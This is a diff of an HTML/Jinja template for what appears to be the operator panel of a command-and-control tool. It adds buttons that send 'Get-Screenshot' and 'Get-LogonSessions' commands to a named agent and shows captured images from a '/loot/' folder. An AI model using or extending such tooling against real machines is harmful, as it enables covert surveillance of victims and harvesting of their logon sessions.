@@ -4,14 +4,22 @@
 {% block content %}
 <div class="block has-background-dark">
 
-    {% if status|length==0 %}
-    <p class="title is-2 has-text-white">Miscellaneous</p><br>
+    <br>
+
+<a href="http://127.0.0.1:5000/{{agentname}}/misc?cmd=Get-Screenshot" class="button is-white is-outlined">Get-Screenshot</a> &nbsp;
+<a href="http://127.0.0.1:5000/{{agentname}}/misc?cmd=Get-LogonSessions" class="button is-white is-outlined">Get-LogonSessions</a>
+
+<br><br>
+
+{% if status|length==0 %}
+    <p class="title is-3 has-text-white">Miscellaneous</p>  <br>
 {% else %}
-<p class="title is-2 has-text-white">{{status}}</p><br>
+
+<pre class="block  has-background-dark " ><p class="title is-3 has-text-white">{{status}}</p></pre>
+
+
 {% endif %}
 
-<a href="http://127.0.0.1:5000/{{agentname}}/misc?cmd=Get-Screenshot" class="button is-white is-outlined">Get-Screenshot</a>
-<br><br><br><br>
 
 {% if pic %}
 <img src="/loot/{{pic}}" alt="error occurred lmao">
